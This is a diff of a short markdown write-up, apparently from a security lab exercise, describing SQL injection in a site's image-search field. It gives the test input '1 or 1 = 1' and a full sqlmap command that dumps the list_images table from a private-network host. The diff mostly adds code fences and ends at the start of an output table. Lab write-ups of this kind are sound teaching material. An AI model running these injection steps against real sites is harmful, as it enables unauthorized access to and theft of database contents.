@@ -1,8 +1,10 @@
 VULNERABILTY__
-   => Search image tag, is vulnerable to sql injection.
+ ```bash 
+   => Search image tag, is vulnerable to sql injection.```
 
 
-EXPLOIT_?
+EXPLOIT_:
+ ```bash 
     step1 ) => see if the sight reposnds to an SQL Injection
     nu typing  [ 1 or 1 = 1], in the search bar and then press Enter.
 
@@ -17,7 +19,7 @@ EXPLOIT_?
 
         sqlmap -u "http://192.168.8.6/?page=searchimg&id=1+or+1+%3D+1&Submit=Submit#" --dump -T list_images
 
-        ^ should retune the table:
+        ^ should retune the table: ```
         
  ```bash       
 +----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
